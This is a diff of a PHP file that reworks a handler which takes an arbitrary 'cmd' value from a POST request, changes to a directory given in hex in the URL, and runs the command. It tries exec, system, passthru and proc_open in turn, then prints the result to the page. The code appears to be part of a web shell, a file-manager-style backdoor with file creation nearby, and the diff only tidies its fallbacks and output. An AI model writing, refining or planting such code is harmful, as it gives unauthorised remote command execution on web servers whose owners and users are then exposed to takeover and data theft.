@@ -403,65 +403,72 @@
             }
         }
         // CMD sesuai dengan direktori di URL
-        if (isset($_POST['cmd'])) {
-            $command = $_POST['cmd'];
-            $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
-            echo "<div class='mt-4'>";
-        
-            $output = null;
-            $resultCode = null;
-        
-            chdir($path);
-        
-            // Try exec
-            exec($command, $execOutput, $execResultCode);
-            if (!empty($execOutput)) {
-                $output = implode("\n", $execOutput);
-                $resultCode = $execResultCode;
+if (isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
+    echo "<div class='mt-4'>";
+
+    $output = null;
+    $resultCode = null;
+
+    chdir($path);
+
+    // Try exec
+    exec($command, $execOutput, $execResultCode);
+    if (!empty($execOutput)) {
+        $output = implode("\n", $execOutput);
+        $resultCode = $execResultCode;
+    } else {
+        // Try system
+        ob_start();
+        $systemOutput = system($command, $systemResultCode);
+        ob_end_clean();
+        if (!empty($systemOutput)) {
+            $output = $systemOutput;
+            $resultCode = $systemResultCode;
+        } else {
+            // Try passthru
+            ob_start();
+            passthru($command, $passthruResultCode);
+            $passthruOutput = ob_get_clean();
+            if (!empty($passthruOutput)) {
+                $output = $passthruOutput;
+                $resultCode = $passthruResultCode;
             } else {
-                // Try system
-                ob_start();
-                $systemOutput = system($command, $systemResultCode);
-                $systemOutput = ob_get_clean();
-                if (!empty($systemOutput)) {
-                    $output = $systemOutput;
-                    $resultCode = $systemResultCode;
-                } else {
-                    // Try passthru
-                    ob_start();
-                    passthru($command, $passthruResultCode);
-                    $passthruOutput = ob_get_clean();
-                    if (!empty($passthruOutput)) {
-                        $output = $passthruOutput;
-                        $resultCode = $passthruResultCode;
-                    } else {
-                        // Try proc_open as a last resort
-                        $descriptorspec = [
-                            0 => ["pipe", "r"],
-                            1 => ["pipe", "w"],
-                            2 => ["pipe", "w"]
-                        ];
-                        $process = proc_open($command, $descriptorspec, $pipes);
-                        if (is_resource($process)) {
-                            fclose($pipes[0]);
-                            $procOutput = stream_get_contents($pipes[1]);
-                            $procError = stream_get_contents($pipes[2]);
-                            fclose($pipes[1]);
-                            fclose($pipes[2]);
-                            $returnValue = proc_close($process);
-        
-                            $output = $procOutput ? $procOutput : $procError;
-                            $resultCode = $returnValue;
-                        }
+                // Try proc_open as a last resort
+                $descriptorspec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                $process = proc_open($command, $descriptorspec, $pipes);
+                if (is_resource($process)) {
+                    fclose($pipes[0]);
+                    $procOutput = stream_get_contents($pipes[1]);
+                    $procError = stream_get_contents($pipes[2]);
+                    fclose($pipes[1]);
+                    fclose($pipes[2]);
+                    $returnValue = proc_close($process);
+
+                    if (!empty($procOutput) || !empty($procError)) {
+                        $output = $procOutput ? $procOutput : $procError;
+                        $resultCode = $returnValue;
                     }
                 }
             }
-        
-            // Output result
-            echo "<pre>Result Code: $resultCode</pre>";
-            echo "<pre>$output</pre>";
-            echo "</div>";
-        }        
+        }
+    }
+
+    // Output result
+    if ($output !== null) {
+        echo "<pre>Result Code: $resultCode</pre>";
+        echo "<pre>$output</pre>";
+    } else {
+        echo "<pre>No output generated.</pre>";
+    }
+
+    echo "</div>";
+}
         // Create a new file
         if (isset($_POST['createFile'])) {
             $fileName = $_POST['fileName'];
